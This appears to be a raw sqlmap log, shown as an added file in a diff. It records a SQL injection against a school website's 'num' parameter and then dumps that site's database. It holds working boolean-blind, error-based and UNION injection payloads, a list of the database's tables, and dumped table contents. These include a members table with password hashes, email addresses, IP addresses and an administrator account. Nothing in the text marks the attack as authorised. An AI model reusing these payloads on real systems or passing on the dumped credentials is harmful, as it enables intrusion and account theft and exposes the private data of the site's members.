@@ -1,0 +1,567 @@
+sqlmap identified the following injection point(s) with a total of 102 HTTP(s) requests:
+---
+Parameter: num (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: page=unidades&num=9 AND 9103=9103
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: page=unidades&num=9 AND ROW(7460,5529)>(SELECT COUNT(*),CONCAT(0x716a767a71,(SELECT (ELT(7460=7460,1))),0x7162716b71,FLOOR(RAND(0)*2))x FROM (SELECT 1457 UNION SELECT 4392 UNION SELECT 7046 UNION SELECT 9169)a GROUP BY x)
+    Vector: AND ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 15 columns
+    Payload: page=unidades&num=-1459 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a767a71,0x4a596e5769456b446b487662494b4d4a6e544a536d7844546847654f4c4e4a42495974486d484f47,0x7162716b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- pKam
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web server operating system: Linux
+web application technology: Apache, Plesk
+back-end DBMS: MySQL >= 4.1
+available databases [3]:
+[*] escola_nonaka
+[*] information_schema
+[*] test
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: num (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: page=unidades&num=9 AND 9103=9103
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: page=unidades&num=9 AND ROW(7460,5529)>(SELECT COUNT(*),CONCAT(0x716a767a71,(SELECT (ELT(7460=7460,1))),0x7162716b71,FLOOR(RAND(0)*2))x FROM (SELECT 1457 UNION SELECT 4392 UNION SELECT 7046 UNION SELECT 9169)a GROUP BY x)
+    Vector: AND ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 15 columns
+    Payload: page=unidades&num=-1459 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a767a71,0x4a596e5769456b446b487662494b4d4a6e544a536d7844546847654f4c4e4a42495974486d484f47,0x7162716b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- pKam
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web server operating system: Linux
+web application technology: Apache, Plesk
+back-end DBMS: MySQL >= 4.1
+Database: escola_nonaka
+[14 tables]
++-----------------------+
+| nonaka_banned         |
+| nonaka_cfg_pais       |
+| nonaka_config         |
+| nonaka_dicas          |
+| nonaka_log_banned     |
+| nonaka_log_online     |
+| nonaka_members        |
+| nonaka_membersgroups  |
+| nonaka_noticias       |
+| nonaka_pages          |
+| nonaka_pages_dinamic  |
+| nonaka_reserved_names |
+| nonaka_textos         |
+| nonaka_unidades       |
++-----------------------+
+
+Database: escola_nonaka
++-----------------------+---------+
+| Table                 | Entries |
++-----------------------+---------+
+| nonaka_cfg_pais       | 239     |
+| nonaka_reserved_names | 25      |
+| nonaka_pages          | 23      |
+| nonaka_config         | 20      |
+| nonaka_members        | 8       |
+| nonaka_unidades       | 6       |
+| nonaka_log_online     | 5       |
+| nonaka_noticias       | 2       |
+| nonaka_pages_dinamic  | 2       |
+| nonaka_dicas          | 1       |
+| nonaka_textos         | 1       |
++-----------------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: num (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: page=unidades&num=9 AND 9103=9103
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: page=unidades&num=9 AND ROW(7460,5529)>(SELECT COUNT(*),CONCAT(0x716a767a71,(SELECT (ELT(7460=7460,1))),0x7162716b71,FLOOR(RAND(0)*2))x FROM (SELECT 1457 UNION SELECT 4392 UNION SELECT 7046 UNION SELECT 9169)a GROUP BY x)
+    Vector: AND ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 15 columns
+    Payload: page=unidades&num=-1459 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a767a71,0x4a596e5769456b446b487662494b4d4a6e544a536d7844546847654f4c4e4a42495974486d484f47,0x7162716b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- pKam
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web server operating system: Linux
+web application technology: Apache, Plesk
+back-end DBMS: MySQL >= 4.1
+Database: escola_nonaka
+[14 tables]
++-----------------------+
+| nonaka_banned         |
+| nonaka_cfg_pais       |
+| nonaka_config         |
+| nonaka_dicas          |
+| nonaka_log_banned     |
+| nonaka_log_online     |
+| nonaka_members        |
+| nonaka_membersgroups  |
+| nonaka_noticias       |
+| nonaka_pages          |
+| nonaka_pages_dinamic  |
+| nonaka_reserved_names |
+| nonaka_textos         |
+| nonaka_unidades       |
++-----------------------+
+
+Database: escola_nonaka
+Table: nonaka_banned
+[0 entries]
++------+---------+
+| type | value   |
++------+---------+
++------+---------+
+
+Database: escola_nonaka
+Table: nonaka_cfg_pais
+[239 entries]
++---------+----------+----------------------------------------------+-----------+------------+--------------+
+| ID_PAIS | pais_lng | pais_name                                    | pais_abbr | pais_moeda | pais_moeda_n |
++---------+----------+----------------------------------------------+-----------+------------+--------------+
+| 1       | <blank>  | Afghanistan                                  | AF        | 5          | AFA          |
+| 2       | <blank>  | Albania                                      | AL        | 490        | ALL          |
+| 3       | <blank>  | Algeria                                      | DZ        | 95         | DZD          |
+| 4       | <blank>  | American Samoa                               | AS        | 911        | WST          |
+| 5       | <blank>  | Andorra                                      | AD        | 690        | ADP          |
+| 6       | <blank>  | Angola                                       | AO        | 635        | AOA          |
+| 7       | <blank>  | Anguilla                                     | AI        | 0          | <blank>      |
+| 8       | <blank>  | Antarctica                                   | <blank>   | 0          | <blank>      |
+| 9       | <blank>  | Antigua and Barbuda                          | AG        | 0          | <blank>      |
+| 10      | <blank>  | Argentina                                    | AR        | 706        | ARS          |
+| 11      | <blank>  | Armenia                                      | AM        | 275        | AMD          |
+| 12      | <blank>  | Aruba                                        | AW        | 328        | AWG          |
+| 13      | <blank>  | Australia                                    | AU        | 150        | AUD          |
+| 14      | <blank>  | Austria                                      | AT        | 978        | EUR          |
+| 15      | <blank>  | Azerbaijan                                   | AZ        | 607        | AZM          |
+| 16      | <blank>  | Bahamas                                      | BS        | 155        | BSD          |
+| 17      | <blank>  | Bahrain                                      | BH        | 105        | BHD          |
+| 18      | <blank>  | Bangladesh                                   | BD        | 905        | BDT          |
+| 19      | <blank>  | Barbados                                     | BB        | 175        | BBD          |
+| 20      | <blank>  | Belarus                                      | BY        | 829        | BYB          |
+| 21      | <blank>  | Belgium                                      | BE        | 978        | EUR          |
+| 22      | <blank>  | Belize                                       | BZ        | 180        | BZD          |
+| 23      | <blank>  | Benin                                        | BJ        | 0          | <blank>      |
+| 24      | <blank>  | Bermuda                                      | BM        | 160        | BMD          |
+| 25      | <blank>  | Bhutan                                       | BT        | 665        | BTN          |
+| 26      | <blank>  | Bolivia                                      | BO        | 30         | BOB          |
+| 27      | <blank>  | Bosnia and Herzegowina                       | BA        | 612        | BAM          |
+| 28      | <blank>  | Botswana                                     | BW        | 755        | BWP          |
+| 29      | <blank>  | Bouvet Island                                | <blank>   | 0          | <blank>      |
+| 30      | pt-br    | Brazil                                       | BR        | 790        | BRL          |
+| 31      | <blank>  | British Indian Ocean Territory               | VG        | 0          | <blank>      |
+| 32      | <blank>  | Brunei Darussalam                            | BN        | 185        | BND          |
+| 33      | <blank>  | Bulgaria                                     | BG        | 510        | BGN          |
+| 34      | <blank>  | Burkina Faso                                 | BF        | 0          | <blank>      |
+| 35      | <blank>  | Burundi                                      | BI        | 385        | BIF          |
+| 36      | <blank>  | Cambodia                                     | KH        | 825        | KHR          |
+| 37      | <blank>  | Cameroon                                     | CM        | 0          | <blank>      |
+| 38      | <blank>  | Canada                                       | CA        | 165        | CAD          |
+| 39      | <blank>  | Cape Verde                                   | CV        | 295        | CVE          |
+| 40      | <blank>  | Cayman Islands                               | KY        | 190        | KYD          |
+| 41      | <blank>  | Central African Republic                     | CF        | 0          | <blank>      |
+| 42      | <blank>  | Chad                                         | TD        | 0          | <blank>      |
+| 43      | <blank>  | Chile                                        | CL        | 715        | CLP          |
+| 44      | <blank>  | China                                        | CN        | 795        | CNY          |
+| 45      | <blank>  | Channel Island                               | GB        | 540        | GBD          |
+| 46      | <blank>  | Cocos (Keeling) Islands                      | CK        | 0          | <blank>      |
+| 47      | <blank>  | Colombia                                     | CO        | 720        | COP          |
+| 48      | <blank>  | Comoros                                      | <blank>   | 368        | KMF          |
+| 49      | <blank>  | Congo                                        | CG        | 971        | ZRN          |
+| 50      | <blank>  | Cook Islands                                 | CK        | 0          | <blank>      |
+| 51      | <blank>  | Costa Rica                                   | CR        | 40         | CRC          |
+| 52      | <blank>  | Cote D'Ivoire                                | <blank>   | 0          | <blank>      |
+| 53      | <blank>  | Croatia                                      | HR        | 779        | HRK          |
+| 54      | <blank>  | Cuba                                         | CU        | 725        | CUP          |
+| 55      | <blank>  | Cyprus                                       | CY        | 520        | CYP          |
+| 56      | <blank>  | Czech Republic                               | CZ        | 75         | CZK          |
+| 57      | <blank>  | Denmark                                      | DK        | 55         | DKK          |
+| 58      | <blank>  | Djibouti                                     | DJ        | 390        | DJF          |
+| 59      | <blank>  | Dominica                                     | DO        | 730        | DOP          |
+| 60      | <blank>  | Dominican Republic                           | DO        | 730        | DOP          |
+| 61      | <blank>  | East Timor                                   | TP        | 320        | TPE          |
+| 62      | <blank>  | Ecuador                                      | EC        | 895        | ECS          |
+| 63      | <blank>  | Egypt                                        | EG        | 535        | EGP          |
+| 64      | <blank>  | El Salvador                                  | SV        | 45         | SVC          |
+| 65      | <blank>  | Equatorial Guinea                            | GQ        | 0          | <blank>      |
+| 66      | <blank>  | Eritrea                                      | ER        | 625        | ERN          |
+| 67      | <blank>  | Estonia                                      | EE        | 57         | EEK          |
+| 68      | <blank>  | Ethiopia                                     | ET        | 9          | ETB          |
+| 69      | <blank>  | Falkland Islands (Malvinas)                  | FK        | 545        | FKP          |
+| 70      | <blank>  | Faroe Islands                                | FO        | 0          | <blank>      |
+| 71      | <blank>  | Fiji                                         | FJ        | 200        | FJD          |
+| 72      | <blank>  | Finland                                      | FI        | 978        | EUR          |
+| 73      | <blank>  | France                                       | FR        | 978        | EUR          |
+| 74      | <blank>  | France, Metropolitan                         | FR        | 978        | EUR          |
+| 75      | <blank>  | French Guiana                                | GF        | 978        | EUR          |
+| 76      | <blank>  | French Polynesia                             | PF        | 978        | EUR          |
+| 77      | <blank>  | French Southern Territories                  | FR        | 978        | EUR          |
+| 78      | <blank>  | Gabon                                        | GA        | 0          | <blank>      |
+| 79      | <blank>  | Gambia                                       | GM        | 90         | GMD          |
+| 80      | <blank>  | Georgia                                      | GE        | 482        | GEL          |
+| 81      | <blank>  | Germany                                      | DE        | 978        | EUR          |
+| 82      | <blank>  | Ghana                                        | GH        | 35         | GHC          |
+| 83      | <blank>  | Gibraltar                                    | GI        | 530        | GIB          |
+| 84      | <blank>  | Greece                                       | GR        | 978        | EUR          |
+| 85      | <blank>  | Greenland                                    | GL        | 0          | <blank>      |
+| 86      | <blank>  | Grenada                                      | GD        | 0          | <blank>      |
+| 87      | <blank>  | Guadeloupe                                   | <blank>   | 0          | <blank>      |
+| 88      | <blank>  | Guam                                         | GU        | 0          | <blank>      |
+| 89      | <blank>  | Guatemala                                    | GT        | 770        | GTQ          |
+| 90      | <blank>  | Guinea                                       | GN        | 398        | GNF          |
+| 91      | 738      | Guinea-bissau                                | GW        | 0          | GWP          |
+| 92      | <blank>  | Guyana                                       | GY        | 170        | GYD          |
+| 93      | <blank>  | Haiti                                        | HT        | 440        | HTG          |
+| 94      | <blank>  | Heard and Mc Donald Islands                  | <blank>   | 0          | <blank>      |
+| 95      | <blank>  | Honduras                                     | HN        | 495        | HNL          |
+| 96      | <blank>  | Hong Kong                                    | HK        | 205        | HKD          |
+| 97      | <blank>  | Hungary                                      | HU        | 345        | HUF          |
+| 98      | <blank>  | Iceland                                      | IS        | 60         | ISK          |
+| 99      | <blank>  | India                                        | IN        | 860        | INR          |
+| 100     | <blank>  | Indonesia                                    | ID        | 865        | IDR          |
+| 101     | <blank>  | Iran (Islamic Republic of)                   | IR        | 815        | IRR          |
+| 102     | <blank>  | Iraq                                         | IQ        | 115        | IQD          |
+| 103     | <blank>  | Ireland                                      | <blank>   | 0          | <blank>      |
+| 104     | <blank>  | Israel                                       | IL        | 880        | ILS          |
+| 105     | <blank>  | Italy                                        | IT        | 978        | EUR          |
+| 106     | <blank>  | Jamaica                                      | JM        | 230        | JMD          |
+| 107     | jap-jp   | Japan                                        | JP        | 470        | JPY          |
+| 108     | <blank>  | Jordan                                       | JO        | 125        | JOD          |
+| 109     | <blank>  | Kazakhstan                                   | KZ        | 913        | KZT          |
+| 110     | <blank>  | Kenya                                        | KE        | 950        | KES          |
+| 111     | <blank>  | Kiribati                                     | <blank>   | 0          | <blank>      |
+| 112     | <blank>  | Korea, Democratic People's Republic of       | KP        | 295        | KPW          |
+| 113     | <blank>  | Korea, Republic of                           | KR        | 930        | KRW          |
+| 114     | <blank>  | Kuwait                                       | KW        | 100        | KWD          |
+| 115     | <blank>  | Kyrgyzstan                                   | KG        | 0          | <blank>      |
+| 116     | <blank>  | Lao People's Democratic Republic             | LA        | 780        | LAK          |
+| 117     | <blank>  | Latvia                                       | LV        | 485        | LVL          |
+| 118     | <blank>  | Lebanon                                      | LB        | 560        | LBP          |
+| 119     | <blank>  | Lesotho                                      | LS        | 603        | LSL          |
+| 120     | <blank>  | Liberia                                      | LR        | 235        | LRD          |
+| 121     | <blank>  | Libyan Arab Jamahiriya                       | LY        | 130        | LYD          |
+| 122     | <blank>  | Liechtenstein                                | LI        | 0          | <blank>      |
+| 123     | <blank>  | Lithuania                                    | LT        | 601        | LTL          |
+| 124     | <blank>  | Luxembourg                                   | LU        | 400        | LUF          |
+| 125     | <blank>  | Macau                                        | MO        | 685        | MOP          |
+| 126     | <blank>  | Macedonia, The Former Yugoslav Republic of   | MK        | 132        | MKD          |
+| 127     | <blank>  | Madagascar                                   | MG        | 405        | MGF          |
+| 128     | <blank>  | Malawi                                       | MW        | 760        | MWK          |
+| 129     | <blank>  | Malaysia                                     | MY        | 828        | MYR          |
+| 130     | <blank>  | Maldives                                     | MV        | 870        | MVR          |
+| 131     | <blank>  | Mali                                         | ML        | 0          | <blank>      |
+| 132     | <blank>  | Malta                                        | MT        | 565        | MTL          |
+| 133     | <blank>  | Marshall Islands                             | MH        | 0          | <blank>      |
+| 134     | <blank>  | Martinique                                   | MQ        | 0          | <blank>      |
+| 135     | <blank>  | Mauritania                                   | MR        | 670        | MRO          |
+| 136     | <blank>  | Mauritius                                    | MU        | 840        | MUR          |
+| 137     | <blank>  | Mayotte                                      | <blank>   | 0          | <blank>      |
+| 138     | <blank>  | Mexico                                       | MX        | 741        | MXN          |
+| 139     | <blank>  | Micronesia, Federated States of              | FM        | 978        | EUR          |
+| 140     | <blank>  | Moldova, Republic of                         | MD        | 503        | MDL          |
+| 141     | <blank>  | Monaco                                       | MC        | 0          | <blank>      |
+| 142     | <blank>  | Mongolia                                     | MN        | 915        | MNT          |
+| 143     | <blank>  | Montserrat                                   | MS        | 0          | <blank>      |
+| 144     | <blank>  | Morocco                                      | MA        | 139        | MAD          |
+| 145     | <blank>  | Mozambique                                   | MZ        | 620        | MZM          |
+| 146     | <blank>  | Myanmar                                      | MM        | 775        | MMK          |
+| 147     | <blank>  | Namibia                                      | NA        | 137        | NAD          |
+| 148     | <blank>  | Nauru                                        | <blank>   | 0          | <blank>      |
+| 149     | <blank>  | Nepal                                        | NP        | 845        | NPR          |
+| 150     | <blank>  | Netherlands                                  | NL        | 978        | EUR          |
+| 151     | <blank>  | Netherlands Antilles                         | AN        | 325        | ANG          |
+| 152     | <blank>  | New Caledonia                                | NC        | 0          | <blank>      |
+| 153     | <blank>  | New Zealand                                  | NZ        | 245        | NZD          |
+| 154     | <blank>  | Nicaragua                                    | NI        | 51         | NIG          |
+| 155     | <blank>  | Niger                                        | NE        | 0          | <blank>      |
+| 156     | <blank>  | Nigeria                                      | NG        | 630        | NGN          |
+| 157     | <blank>  | Niue                                         | NZ        | 245        | NZD          |
+| 158     | <blank>  | Norfolk Island                               | AU        | 150        | AUD          |
+| 159     | <blank>  | Northern Mariana Islands                     | GB        | 540        | GBP          |
+| 160     | <blank>  | Norway                                       | NO        | 65         | NOK          |
+| 161     | <blank>  | Oman                                         | OM        | 805        | OMR          |
+| 162     | <blank>  | Pakistan                                     | PK        | 875        | PKR          |
+| 163     | <blank>  | Palau                                        | PW        | 0          | <blank>      |
+| 164     | <blank>  | Panama                                       | PA        | 20         | PAB          |
+| 165     | <blank>  | Papua New Guinea                             | PG        | 778        | PGK          |
+| 166     | <blank>  | Paraguay                                     | PY        | 450        | PYG          |
+| 167     | <blank>  | Peru                                         | PE        | 660        | PEN          |
+| 168     | <blank>  | Philippines                                  | PH        | 765        | PHP          |
+| 169     | <blank>  | Pitcairn                                     | <blank>   | 0          | <blank>      |
+| 170     | <blank>  | Poland                                       | PL        | 975        | PLN          |
+| 171     | <blank>  | Portugal                                     | PT        | 978        | EUR          |
+| 172     | <blank>  | Puerto Rico                                  | PR        | 0          | <blank>      |
+| 173     | <blank>  | Qatar                                        | QA        | 800        | QAR          |
+| 174     | <blank>  | Reunion                                      | RE        | 0          | <blank>      |
+| 175     | <blank>  | Romania                                      | RO        | 505        | ROL          |
+| 176     | <blank>  | Russian Federation                           | RU        | 830        | RUB          |
+| 177     | <blank>  | Rwanda                                       | RW        | 420        | RFW          |
+| 178     | <blank>  | Saint Kitts and Nevis                        | KN        | 0          | <blank>      |
+| 179     | <blank>  | Saint Lucia                                  | LC        | 0          | <blank>      |
+| 180     | <blank>  | Saint Vincent and the Grenadines             | VC        | 0          | <blank>      |
+| 181     | <blank>  | Samoa                                        | AS        | 911        | WST          |
+| 182     | <blank>  | San Marino                                   | IT        | 978        | EUR          |
+| 183     | <blank>  | Sao Tome and Principe                        | ST        | 148        | STD          |
+| 184     | <blank>  | Saudi Arabia                                 | SA        | 820        | SAR          |
+| 185     | <blank>  | Senegal                                      | SN        | 0          | <blank>      |
+| 186     | <blank>  | Seychelles                                   | SC        | 850        | SCR          |
+| 187     | <blank>  | Sierra Leone                                 | SL        | 500        | SLL          |
+| 188     | <blank>  | Singapore                                    | SG        | 195        | SGD          |
+| 189     | <blank>  | Slovakia (Slovak Republic)                   | SK        | 58         | SKK          |
+| 190     | <blank>  | Slovenia                                     | SI        | 914        | SIT          |
+| 191     | <blank>  | Solomon Islands                              | SB        | 250        | SBD          |
+| 192     | <blank>  | Somalia                                      | SO        | 960        | SOS          |
+| 193     | <blank>  | South Africa                                 | ZA        | 785        | ZAR          |
+| 194     | <blank>  | South Georgia and the South Sandwich Islands | GS        | 545        | FKP          |
+| 195     | <blank>  | Spain                                        | ES        | 978        | EUR          |
+| 196     | <blank>  | Sri Lanka                                    | LK        | 855        | LKR          |
+| 197     | <blank>  | St. Helena                                   | SH        | 570        | HSP          |
+| 198     | <blank>  | St. Pierre and Miquelon                      | <blank>   | 0          | <blank>      |
+| 199     | <blank>  | Sudan                                        | SD        | 134        | SDD          |
+| 200     | <blank>  | Suriname                                     | SR        | 255        | SRD          |
+| 201     | <blank>  | Svalbard and Jan Mayen Islands               | <blank>   | 0          | <blank>      |
+| 202     | <blank>  | Swaziland                                    | SZ        | 585        | SZL          |
+| 203     | <blank>  | Sweden                                       | SE        | 70         | SEK          |
+| 204     | <blank>  | Switzerland                                  | CH        | 425        | CHF          |
+| 205     | <blank>  | Syrian Arab Republic                         | SY        | 575        | SYP          |
+| 206     | <blank>  | Taiwan                                       | TW        | 640        | TWD          |
+| 207     | <blank>  | Tajikistan                                   | TJ        | 835        | TJR          |
+| 208     | <blank>  | Tanzania, United Republic of                 | TZ        | 946        | TZS          |
+| 209     | <blank>  | Thailand                                     | TH        | 15         | THB          |
+| 210     | <blank>  | Togo                                         | TG        | 0          | <blank>      |
+| 211     | <blank>  | Tokelau                                      | <blank>   | 0          | <blank>      |
+| 212     | <blank>  | Tonga                                        | TO        | 680        | TOP          |
+| 213     | <blank>  | Trinidad and Tobago                          | TT        | 210        | TTD          |
+| 214     | <blank>  | Tunisia                                      | TN        | 135        | TND          |
+| 215     | <blank>  | Turkey                                       | TR        | 600        | TRL          |
+| 216     | <blank>  | Turkmenistan                                 | TM        | 0          | <blank>      |
+| 217     | <blank>  | Turks and Caicos Islands                     | TC        | 0          | <blank>      |
+| 218     | <blank>  | Tuvalu                                       | <blank>   | 0          | <blank>      |
+| 219     | <blank>  | Uganda                                       | UG        | 955        | UGX          |
+| 220     | <blank>  | Ukraine                                      | UA        | 460        | UAH          |
+| 221     | <blank>  | United Arab Emirates                         | AE        | 145        | AED          |
+| 222     | <blank>  | United Kingdom                               | GB        | 540        | GBP          |
+| 223     | en-en    | United States                                | US        | 220        | USD          |
+| 224     | <blank>  | United States Minor Outlying Islands         | US        | 220        | USD          |
+| 225     | <blank>  | Uruguay                                      | UY        | 745        | UYU          |
+| 226     | <blank>  | Uzbekistan                                   | UZ        | 893        | UZS          |
+| 227     | <blank>  | Vanuatu                                      | VU        | 920        | VUV          |
+| 228     | <blank>  | Vatican City State                           | VA        | 0          | <blank>      |
+| 229     | <blank>  | Venezuela                                    | VE        | 25         | VEB          |
+| 230     | <blank>  | Vietnam                                      | VN        | 260        | VND          |
+| 231     | <blank>  | Virgin Islands (British)                     | GB        | 540        | GBP          |
+| 232     | <blank>  | Virgin Islands (U.S.)                        | US        | 220        | USD          |
+| 233     | <blank>  | Wallis and Futuna Islands                    | WF        | 0          | <blank>      |
+| 234     | <blank>  | Western Sahara                               | <blank>   | 0          | <blank>      |
+| 235     | <blank>  | Yemen                                        | YE        | 810        | YER          |
+| 236     | <blank>  | Yugoslavia                                   | <blank>   | 0          | <blank>      |
+| 237     | <blank>  | Zaire                                        | ZR        | 0          | <blank>      |
+| 238     | <blank>  | Zambia                                       | ZM        | 765        | ZMK          |
+| 239     | <blank>  | Zimbabwe                                     | ZW        | 217        | ZWD          |
++---------+----------+----------------------------------------------+-----------+------------+--------------+
+
+Database: escola_nonaka
+Table: nonaka_config
+[20 entries]
++------------+------------------------------+
+| item       | valor                        |
++------------+------------------------------+
+| cookie     | SiteNonaka                   |
+| cookieleng | 60                           |
+| prefix     | nonaka_                      |
+| email      | contato@escolanonaka.com.br  |
+| lng        | pt_Br.lng                    |
+| manutencao | 0                            |
+| xml_versao | 1.0                          |
+| xml_code   | iso-8859-1                   |
+| modelo     | 1                            |
+| site_name  | Nonaka                       |
+| agree      | "aqui vem o texto de acordo" |
+| regagree   | 0                            |
+| forcelogin | 0                            |
+| antiflood  | 0                            |
+| epass      | 0                            |
+| emailnotif | 0                            |
+| emailwell  | 0                            |
+| separate   | <atr_sep>                    |
+| index      | index.php                    |
+| dmenu      | 1                            |
++------------+------------------------------+
+
+Database: escola_nonaka
+Table: nonaka_dicas
+[1 entry]
++---------+----------+----------+------------+------------+-------------------+------------------------------------------------------------------------------------------------------------------------------------------------+
+| ID_DICA | dica_thb | dica_img | dica_data  | dica_fonte | dica_titulo       | dica_conteudo                                                                                                                                  |
++---------+----------+----------+------------+------------+-------------------+------------------------------------------------------------------------------------------------------------------------------------------------+
+| 93      | <blank>  | <blank>  | 2008-10-03 | <blank>    | UNIDADE LIBERDADE | UNIDADE VILA FORMOSA\r\n\r\nCurso de aperfeiçoamento de cortes de cabelos ao domingos.Com o professor Yoshi. Horário das 9:00 hs.às 12:00hs... |
++---------+----------+----------+------------+------------+-------------------+------------------------------------------------------------------------------------------------------------------------------------------------+
+
+Database: escola_nonaka
+Table: nonaka_log_banned
+[0 entries]
++----+-------+---------+
+| ip | email | logTime |
++----+-------+---------+
++----+-------+---------+
+
+Database: escola_nonaka
+Table: nonaka_log_online
+[5 entries]
++------------+------+------+------------+
+| identity   | ip   | url  | logTime    |
++------------+------+------+------------+
+| 14048      | NULL | NULL | 1553803200 |
+| 14387      | NULL | NULL | 1553802646 |
+| 16380      | NULL | NULL | 1553803424 |
+| 39575      | NULL | NULL | 1553802770 |
+| 63631      | NULL | NULL | 1553803318 |
++------------+------+------+------------+
+
+Database: escola_nonaka
+Table: nonaka_members
+[8 entries]
++-----------+------+------+-----------+------+------+---------+------+---------+--------+----------------------------------+---------+---------+---------+----------+---------+---------+------------+----------+----------+-----------------+-----------+-----------+------------+------------+------------+------------+------------+-------------+------------+------------+------------+---------------+--------------+---------------------------------+----------------+----------------+
+| ID_MEMBER | MSN  | YIM  | cep       | ICQ  | AIM  | city    | sexo | telres  | number | passwd                           | bairro  | telcom  | estado  | address  | lngfile | company | realName   | location | discount | memberIP        | add_compl | userNivel | birthdate  | lastLogin  | timeOffset | onlineTime | telcelular | memberName  | lastOnline | timeFormat | LastLogout | memberGroup   | secretAnswer | emailAddress                    | secretQuestion | dateRegistered |
++-----------+------+------+-----------+------+------+---------+------+---------+--------+----------------------------------+---------+---------+---------+----------+---------+---------+------------+----------+----------+-----------------+-----------+-----------+------------+------------+------------+------------+------------+-------------+------------+------------+------------+---------------+--------------+---------------------------------+----------------+----------------+
+| 1         | NULL | NULL | 123123123 | NULL | NULL | dasdasd | NULL | 111     | 11     | c995562475b7d797454d411691b5bb1e | asdas   | <blank> | as      | asdasdas | NULL    | <blank> | Atr2 Japan | 16       | NULL     | 201.95.65.217   | NULL      | 6         | 2006-02-12 | 1238089916 | NULL       | 0          | <blank>    | atr2        | NULL       | NULL       | 0          | Administrador | <blank>      | innocenti@atr2japan.com.br      | <blank>        | 1145885304     |
+| 5         | NULL | NULL | <blank>   | NULL | NULL | <blank> | NULL | <blank> | 0      | 7c6e876b6e8c9eebdf3ea1092da5febb | <blank> | <blank> | <blank> | <blank>  | NULL    | <blank> | NULL       | NULL     | NULL     | 200.171.151.147 | NULL      | 5         | NULL       | NULL       | NULL       | 0          | <blank>    | tatuape     | NULL       | NULL       | 0          | <blank>       | <blank>      | tatuape@escolanonaka.com.br     | <blank>        | 1170867526     |
+| 6         | NULL | NULL | <blank>   | NULL | NULL | <blank> | NULL | <blank> | 0      | f8e0cde8856d9f588ba4a6a3e8351d69 | <blank> | <blank> | <blank> | <blank>  | NULL    | <blank> | NULL       | NULL     | NULL     | 200.171.151.147 | NULL      | 5         | NULL       | 1172512771 | NULL       | 0          | <blank>    | vilaformosa | NULL       | NULL       | 0          | <blank>       | <blank>      | vilaformosa@escolanonaka.com.br | <blank>        | 1170867577     |
+| 7         | NULL | NULL | <blank>   | NULL | NULL | <blank> | NULL | <blank> | 0      | 0637ba676297a3a5625c9dd196b6d261 | <blank> | <blank> | <blank> | <blank>  | NULL    | <blank> | NULL       | NULL     | NULL     | 200.171.151.147 | NULL      | 5         | NULL       | 1172509654 | NULL       | 0          | <blank>    | tucuruvi    | NULL       | NULL       | 0          | <blank>       | <blank>      | tucuruvi@escolanonaka.com.br    | <blank>        | 1170867614     |
+| 8         | NULL | NULL | <blank>   | NULL | NULL | <blank> | NULL | <blank> | 0      | a42bef89994004e491cb1eda6db75f76 | <blank> | <blank> | <blank> | <blank>  | NULL    | <blank> | NULL       | NULL     | NULL     | 200.171.151.147 | NULL      | 5         | NULL       | 1172509911 | NULL       | 0          | <blank>    | arthuralvim | NULL       | NULL       | 0          | <blank>       | <blank>      | arthuralvim@escolanonaka.com.br | <blank>        | 1170867659     |
+| 9         | NULL | NULL | <blank>   | NULL | NULL | <blank> | NULL | <blank> | 0      | c1184087416fe6a90373db82bc218fb2 | <blank> | <blank> | <blank> | <blank>  | NULL    | <blank> | NULL       | NULL     | NULL     | 200.171.151.147 | NULL      | 5         | NULL       | 1172509711 | NULL       | 0          | <blank>    | santana     | NULL       | NULL       | 0          | <blank>       | <blank>      | santana@escolanonaka.com.br     | <blank>        | 1170867757     |
